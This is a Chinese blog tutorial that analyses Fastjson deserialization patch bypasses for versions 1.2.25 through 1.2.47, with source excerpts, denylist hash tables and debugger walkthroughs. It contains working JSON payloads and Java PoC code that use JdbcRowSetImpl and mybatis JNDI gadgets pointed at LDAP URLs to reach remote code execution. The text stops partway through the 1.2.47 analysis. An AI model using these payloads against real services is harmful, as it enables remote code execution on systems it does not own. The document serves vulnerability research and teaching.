# Java 反序列化 Fastjson 篇 03-Fastjson 各版本绕过分析

> **本篇文章讲的历史补丁版本绕过的利用，都必须开启AutoTypeSupport才能成功**

## 0x01 前言

我们上篇文章分析了 Fastjson 1.2.24 版本的漏洞，这篇文章主要讲一讲 1.2.25 之后版本的绕过手段。

在讲这个之前，我们先看一看 Fastjson 的 1.2.25 版本是如何修复 1.2.24 版本的漏洞的。

## 0x02 分析 Fastjson 1.2.25 版本是如何修复漏洞的

### checkAutoType()

修补方案就是将DefaultJSONParser.parseObject()函数中的`TypeUtils.loadClass`替换为checkAutoType()函数：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/checkAutoType.png)

看下checkAutoType()函数，具体的可看注释：

JAVA

```
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {
        return null;
    }
 
    final String className = typeName.replace('$', '.');
 
    // autoTypeSupport默认为False
    // 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤
    if (autoTypeSupport || expectClass != null) {
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                return TypeUtils.loadClass(typeName, defaultClassLoader);
            }
        }
 
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }
 
    // 从Map缓存中获取类，注意这是后面版本的漏洞点
    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) {
        clazz = deserializers.findClass(typeName);
    }
 
    if (clazz != null) {
        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }
 
        return clazz;
    }
 
    // 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错
    if (!autoTypeSupport) {
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
 
                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
        }
    }
 
    if (autoTypeSupport || expectClass != null) {
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
    }
 
    if (clazz != null) {
 
        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
            || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
           ) {
            throw new JSONException("autoType is not support. " + typeName);
        }
 
        if (expectClass != null) {
            if (expectClass.isAssignableFrom(clazz)) {
                return clazz;
            } else {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }
        }
    }
 
    if (!autoTypeSupport) {
        throw new JSONException("autoType is not support. " + typeName);
    }
 
    return clazz;
}
```

简单地说，`checkAutoType()`函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。

默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。

denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：

JAVA

```
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。

运行能看到报错信息，说autoType不支持该类：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/AutoTypeDeny.png)

调试分析看到，就是在`checkAutoType()`函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/BlackListDebug.png)

### autoTypeSupport

autoTypeSupport是`checkAutoType()`函数出现后ParserConfig.java中新增的一个配置选项，在`checkAutoType()`函数的某些代码逻辑起到开关的作用。

默认情况下autoTypeSupport为False，将其设置为True有两种方法：

- JVM启动参数：`-Dfastjson.parser.autoTypeSupport=true`
- 代码中设置：`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`，如果有使用非全局ParserConfig则用另外调用`setAutoTypeSupport(true);`

AutoType白名单设置方法：

1. JVM启动参数：`-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.`
2. 代码中设置：`ParserConfig.getGlobalInstance().addAccept("com.xx.a");`
3. 通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：`fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.`

### 小结补丁手段

在1.2.24之后的版本中，使用了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。

网上一些文章讲的都是针对1.2.41、1.2.42、1.2.43、1.2.45这些特定版本的补丁绕过，其实实际上并不只是针对该特定版本，而是针对从1.2.25开始的一系列版本，自己试下就知道PoC可以打哪些范围了。

## 0x03 寻找可用利用链

通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。

从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：https://github.com/LeadroyaL/fastjson-blacklist

目前已知的哈希黑名单的对应表如下：

| version | hash                 | hex-hash            | name                                                         |
| ------- | -------------------- | ------------------- | ------------------------------------------------------------ |
| 1.2.42  | -8720046426850100497 | 0x86fc2bf9beaf7aefL | org.apache.commons.collections4.comparators                  |
| 1.2.42  | -8109300701639721088 | 0x8f75f9fa0df03f80L | org.python.core                                              |
| 1.2.42  | -7966123100503199569 | 0x9172a53f157930afL | org.apache.tomcat                                            |
| 1.2.42  | -7766605818834748097 | 0x9437792831df7d3fL | org.apache.xalan                                             |
| 1.2.42  | -6835437086156813536 | 0xa123a62f93178b20L | javax.xml                                                    |
| 1.2.42  | -4837536971810737970 | 0xbcdd9dc12766f0ceL | org.springframework.                                         |
| 1.2.42  | -4082057040235125754 | 0xc7599ebfe3e72406L | org.apache.commons.beanutils                                 |
| 1.2.42  | -2364987994247679115 | 0xdf2ddff310cdb375L | org.apache.commons.collections.Transformer                   |
| 1.2.42  | -1872417015366588117 | 0xe603d6a51fad692bL | org.codehaus.groovy.runtime                                  |
| 1.2.42  | -254670111376247151  | 0xfc773ae20c827691L | java.lang.Thread                                             |
| 1.2.42  | -190281065685395680  | 0xfd5bfc610056d720L | javax.net.                                                   |
| 1.2.42  | 313864100207897507   | 0x45b11bc78a3aba3L  | com.mchange                                                  |
| 1.2.42  | 1203232727967308606  | 0x10b2bdca849d9b3eL | org.apache.wicket.util                                       |
| 1.2.42  | 1502845958873959152  | 0x14db2e6fead04af0L | java.util.jar.                                               |
| 1.2.42  | 3547627781654598988  | 0x313bb4abd8d4554cL | org.mozilla.javascript                                       |
| 1.2.42  | 3730752432285826863  | 0x33c64b921f523f2fL | java.rmi                                                     |
| 1.2.42  | 3794316665763266033  | 0x34a81ee78429fdf1L | java.util.prefs.                                             |
| 1.2.42  | 4147696707147271408  | 0x398f942e01920cf0L | com.sun.                                                     |
| 1.2.42  | 5347909877633654828  | 0x4a3797b30328202cL | java.util.logging.                                           |
| 1.2.42  | 5450448828334921485  | 0x4ba3e254e758d70dL | org.apache.bcel                                              |
| 1.2.42  | 5751393439502795295  | 0x4fd10ddc6d13821fL | java.net.Socket                                              |
| 1.2.42  | 5944107969236155580  | 0x527db6b46ce3bcbcL | org.apache.commons.fileupload                                |
| 1.2.42  | 6742705432718011780  | 0x5d92e6ddde40ed84L | org.jboss                                                    |
| 1.2.42  | 7179336928365889465  | 0x63a220e60a17c7b9L | org.hibernate                                                |
| 1.2.42  | 7442624256860549330  | 0x6749835432e0f0d2L | org.apache.commons.collections.functors                      |
| 1.2.42  | 8838294710098435315  | 0x7aa7ee3627a19cf3L | org.apache.myfaces.context.servlet                           |
| 1.2.43  | -2262244760619952081 | 0xe09ae4604842582fL | java.net.URL                                                 |
| 1.2.46  | -8165637398350707645 | 0x8eadd40cb2a94443L | junit.                                                       |
| 1.2.46  | -8083514888460375884 | 0x8fd1960988bce8b4L | org.apache.ibatis.datasource                                 |
| 1.2.46  | -7921218830998286408 | 0x92122d710e364fb8L | org.osjava.sj.                                               |
| 1.2.46  | -7768608037458185275 | 0x94305c26580f73c5L | org.apache.log4j.                                            |
| 1.2.46  | -6179589609550493385 | 0xaa3daffdb10c4937L | org.logicalcobwebs.                                          |
| 1.2.46  | -5194641081268104286 | 0xb7e8ed757f5d13a2L | org.apache.logging.                                          |
| 1.2.46  | -3935185854875733362 | 0xc963695082fd728eL | org.apache.commons.dbcp                                      |
| 1.2.46  | -2753427844400776271 | 0xd9c9dbf6bbd27bb1L | com.ibatis.sqlmap.engine.datasource                          |
| 1.2.46  | -1589194880214235129 | 0xe9f20bad25f60807L | org.jdom.                                                    |
| 1.2.46  | 1073634739308289776  | 0xee6511b66fd5ef0L  | org.slf4j.                                                   |
| 1.2.46  | 5688200883751798389  | 0x4ef08c90ff16c675L | javassist.                                                   |
| 1.2.46  | 7017492163108594270  | 0x616323f12c2ce25eL | oracle.net                                                   |
| 1.2.46  | 8389032537095247355  | 0x746bd4a53ec195fbL | org.jaxen.                                                   |
| 1.2.48  | 1459860845934817624  | 0x144277b467723158L | java.net.InetAddress                                         |
| 1.2.48  | 8409640769019589119  | 0x74b50bb9260e31ffL | java.lang.Class                                              |
| 1.2.49  | 4904007817188630457  | 0x440e89208f445fb9L | com.alibaba.fastjson.annotation                              |
| 1.2.59  | 5100336081510080343  | 0x46c808a4b5841f57L | org.apache.cxf.jaxrs.provider.                               |
| 1.2.59  | 6456855723474196908  | 0x599b5c1213a099acL | ch.qos.logback.                                              |
| 1.2.59  | 8537233257283452655  | 0x767a586a5107feefL | net.sf.ehcache.transaction.manager.                          |
| 1.2.60  | 3688179072722109200  | 0x332f0b5369a18310L | com.zaxxer.hikari.                                           |
| 1.2.61  | -4401390804044377335 | 0xc2eb1e621f439309L | flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor |
| 1.2.61  | -1650485814983027158 | 0xe9184be55b1d962aL | org.apache.openjpa.ee.                                       |
| 1.2.61  | -1251419154176620831 | 0xeea210e8da2ec6e1L | oracle.jdbc.rowset.OracleJDBCRowSet                          |
| 1.2.61  | -9822483067882491    | 0xffdd1a80f1ed3405L | com.mysql.cj.jdbc.admin.                                     |
| 1.2.61  | 99147092142056280    | 0x1603dc147a3e358L  | oracle.jdbc.connector.OracleManagedConnectionFactory         |
| 1.2.61  | 3114862868117605599  | 0x2b3a37467a344cdfL | org.apache.ibatis.parsing.                                   |
| 1.2.61  | 4814658433570175913  | 0x42d11a560fc9fba9L | org.apache.axis2.jaxws.spi.handler.                          |
| 1.2.61  | 6511035576063254270  | 0x5a5bd85c072e5efeL | jodd.db.connection.                                          |
| 1.2.61  | 8925522461579647174  | 0x7bddd363ad3998c6L | org.apache.commons.configuration.JNDIConfiguration           |
| 1.2.62  | -9164606388214699518 | 0x80d0c70bcc2fea02L | org.apache.ibatis.executor.                                  |
| 1.2.62  | -8649961213709896794 | 0x87f52a1b07ea33a6L | net.sf.cglib.                                                |
| 1.2.62  | -5764804792063216819 | 0xafff4c95b99a334dL | com.mysql.cj.jdbc.MysqlDataSource                            |
| 1.2.62  | -4438775680185074100 | 0xc2664d0958ecfe4cL | aj.org.objectweb.asm.                                        |
| 1.2.62  | -3319207949486691020 | 0xd1efcdf4b3316d34L | oracle.jdbc.                                                 |
| 1.2.62  | -2192804397019347313 | 0xe1919804d5bf468fL | org.apache.commons.collections.comparators.                  |
| 1.2.62  | -2095516571388852610 | 0xe2eb3ac7e56c467eL | net.sf.ehcache.hibernate.                                    |
| 1.2.62  | 4750336058574309     | 0x10e067cd55c5e5L   | com.mysql.cj.log.                                            |
| 1.2.62  | 218512992947536312   | 0x3085068cb7201b8L  | org.h2.jdbcx.                                                |
| 1.2.62  | 823641066473609950   | 0xb6e292fa5955adeL  | org.apache.commons.logging.                                  |
| 1.2.62  | 1534439610567445754  | 0x154b6cb22d294cfaL | org.apache.ibatis.reflection.                                |
| 1.2.62  | 1818089308493370394  | 0x193b2697eaaed41aL | org.h2.server.                                               |
| 1.2.62  | 2164696723069287854  | 0x1e0a8c3358ff3daeL | org.apache.ibatis.datasource.                                |
| 1.2.62  | 2653453629929770569  | 0x24d2f6048fef4e49L | org.objectweb.asm.                                           |
| 1.2.62  | 2836431254737891113  | 0x275d0732b877af29L | flex.messaging.util.concurrent.                              |
| 1.2.62  | 3089451460101527857  | 0x2adfefbbfe29d931L | org.apache.ibatis.javassist.                                 |
| 1.2.62  | 3718352661124136681  | 0x339a3e0b6beebee9L | org.apache.ibatis.ognl.                                      |
| 1.2.62  | 4046190361520671643  | 0x3826f4b2380c8b9bL | com.mysql.cj.jdbc.MysqlConnectionPoolDataSource              |
| 1.2.62  | 6280357960959217660  | 0x5728504a6d454ffcL | org.apache.ibatis.scripting.                                 |
| 1.2.62  | 6734240326434096246  | 0x5d74d3e5b9370476L | com.mysql.cj.jdbc.MysqlXADataSource                          |
| 1.2.62  | 7123326897294507060  | 0x62db241274397c34L | org.apache.commons.collections.functors.                     |
| 1.2.62  | 8488266005336625107  | 0x75cc60f5871d0fd3L | org.apache.commons.configuration                             |

目前未知的哈希黑名单：

| version | hash                 | hex-hash            | name |
| ------- | -------------------- | ------------------- | ---- |
| 1.2.42  | 33238344207745342    | 0x761619136cc13eL   |      |
| 1.2.62  | -6316154655839304624 | 0xa85882ce1044c450L |      |
| 1.2.62  | -5472097725414717105 | 0xb40f341c746ec94fL |      |
| 1.2.62  | -4608341446948126581 | 0xc00be1debaf2808bL |      |
| 1.2.62  | 3256258368248066264  | 0x2d308dbbc851b0d8L |      |
| 1.2.62  | 4841947709850912914  | 0x43320dc9d2ae0892L |      |
| 1.2.62  | 6534946468240507089  | 0x5ab0cb3071ab40d1L |      |

## 0x04 1.2.25 - 1.2.41 补丁绕过

### EXP

本地的 Fastjson 版本是 1.2.41，我们可以先试一试之前用的 EXP，情况会怎么样。

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/FailedEXP01.png)

看到这里，黑名单里面，被 ban 了。

看了别人的 payload，意思是简单绕过，既然 sun 包里面的这个 `JdbcRowSetImpl` 类被 ban 了，尝试在 `com.sun.rowset.JdbcRowSetImpl` 前面加一个 L，结尾加上 `;` 绕过

- 然后开启 `AutoTypeSupport`

EXP 如下

JAVA

```
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
  
public class SuccessBypassEXP {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
 String payload ="{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";  
 JSON.parse(payload);  
 }  
}
```

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Success1241.png)

### 调试分析

我们注意到，PoC和之前的不同之处在于在”`com.sun.rowset.JdbcRowSetImpl`”类名的前面加了”`L`”、后面加了”`;`”就绕过了黑名单过滤。

下面我们调试分析看看为啥会绕过。首先要知道一点，`Lcom.sun.rowset.JdbcRowSetImpl;` 这个类其实是不存在的。

- 断点下在 `ParseConfig` 的 `checkAutoType()` 方法

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/checkAutoTypeDebug.png)

开始调试，先一路进到这个地方，就是我们前文所说的黑名单了。

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/denyListDebug.png)

继续往里走，它会判断我们 `@type` 类是否为黑名单那里面的类。这里会循环很久，可以直接跳出来，继续往下走。

然后会走到一个特别重要与核心的方法 ————
`loadClass()`，它隶属的类是 `TypeUTtils`

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/TypeUtils.png)

往下走，有一步语句非常非常关键。

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/replaceBypass.png)

意思是，如果我们这个类的起始是 `L`，结尾是 `;`，就把这两个家伙给干掉，变成空白，所以这里返回过来的就是 `com.sun.rowset.JdbcRowSetImpl` 了，就可以进行我们的恶意利用，这个代码写出来也是有点……

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/ReturnEXP.png)

## 0x05 1.2.25-1.2.42 补丁绕过

### EXP

EXP 是这样的

JSON

```
{
	"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
	"dataSourceName":"ldap://localhost:1389/Exploit", 
	"autoCommit":true
}
```

这里代码运行的逻辑是，如果还是按照我们的 EXP 写的话，Fastjson 会先行提取 `L` 和 `;`，也就是逻辑不准确，所以我们这里可以直接写两个来绕过。

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Success1242.png)

## 0x06 1.2.25-1.2.43 补丁绕过

### EXP

直接给出payload：

JSON

```
{
	"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
	"dataSourceName":"ldap://localhost:1389/Exploit",
	"autoCommit":true
}
```

关键PoC：`[com.sun.rowset.JdbcRowSetImpl`

如果我们一开始payload直接这样写是会报错的：

JSON

```
{
	"@type":"[com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://localhost:1389/Exploit",
	"autoCommit":true
}
```

报错信息如下，显示期待在42列的位置接受个”`[`“符号，而42列正好是第一个逗号”`,`”前一个位置：

```
Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,, pos 42, json : {"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
```

因此改下payload，在第一个逗号前面加个”`[`“：

JSON

```
{
	"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
	"dataSourceName":"ldap://localhost:1389/Exploit",
	"autoCommit":true
}
```

继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的`”[“`字符的后一个位置：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Success1243.png)

### 调试分析

调试发现，在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/ErrorLL.png)

但是以 `”[“`开头的类名自然能成功绕过上述校验以及黑名单过滤。

继续往下调试，在`TypeUtils.loadClass()`函数中，除了前面看到的判断是否以”`L`”开头、以”`;`”结尾的if判断语句外，在其前面还有一个判断是否以”`[`“开头的if判断语句，是的话就提取其中的类名，并调用`Array.newInstance().getClass()`来获取并返回类：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Judge.png)

解析完返回的类名是”`[com.sun.rowset.JdbcRowSetImpl`”，通过`checkAutoType()`函数检测之后，到后面就是读该类进行反序列化了：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/deserializer.png)

在反序列化中，调用了`DefaultJSONParser.parseArray()`函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”`[`“、”`{`“等，前面一开始尝试的几个payload报错的原因正是出在这里：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/PayloadError.png)

把这些条件一一满足后，就能成功利用了

## 0x07 1.2.25-1.2.45补丁绕过

### 绕过利用 EXP

**前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本。**

直接给出payload，要连LDAP或RMI都可以：

JSON

```
{
	"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
	"properties":
	{
		"data_source":"ldap://localhost:1389/Exploit"
	}
}
```

关键PoC：`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`

主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.46的版本中可以看到：

| version | hash                 | hex-hash            | name                         |
| ------- | -------------------- | ------------------- | ---------------------------- |
| 1.2.46  | -8083514888460375884 | 0x8fd1960988bce8b4L | org.apache.ibatis.datasource |

EXP 如下

JAVA

```
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
  
// Fastjson 1.2.41 版本的绕过  
public class SuccessBypassEXP_45 {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
 String payload ="{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"," +  
                "\"properties\":{\"data_source\":\"ldap://localhost:1234/Exploit\"}}";  
 JSON.parse(payload);  
 }  
}
```

成功

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Success1245.png)

### 调试分析

调试`checkAutoType()`函数，看到对前一个补丁绕过方法的”`[`“字符进行了过滤，只要类名以”`[`“开头就直接抛出异常：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Debug1245.png)

后面由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过`checkAutoType()`函数的检测。

继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。

由于payload中设置了properties属性值，且`JndiDataSourceFactory.setProperties()`方法满足之前说的Fastjson会自动调用的`setter`方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。

直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即`InitialContext.lookup()`，其中参数由我们输入的properties属性中的data_source值获取的：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/dataSource.png)

之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。

## 0x08 1.2.25-1.2.47补丁绕过

### EXP

本次Fastjson反序列化漏洞也是基于`checkAutoType()`函数绕过的，并且**无需开启AutoTypeSupport**，大大提高了成功利用的概率。

绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，`checkAutoType()`就会抛出异常终止程序。

Demo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：

EXP 如下

JAVA

```
import com.alibaba.fastjson.JSON;
 
public class JdbcRowSetImplPoc {
    public static void main(String[] argv){
        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
                + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
```

成功

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Success1247.png)

### 调试分析

实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。

但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：

- 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；
- 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；

在调用`DefaultJSONParser.parserObject()`函数时，其会对JSON数据进行循环遍历扫描解析。

在第一次扫描解析中，进行`checkAutoType()`函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的`findClass()`函数中直接被找到，并在后面的if判断clazz不为空后直接返回：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Class.png)

往下调试，调用到`MiscCodec.deserialze()`，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/val.png)![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/val02.png)

接着判断clazz是否为Class类，是的话调用`TypeUtils.loadClass()`加载strVal变量值指向的类：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/StrVal.png)

在`TypeUtils.loadClass()`函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/Map.png)

在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用`TypeUtils.getClassFromMapping()`时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过`checkAutoType()`检测：

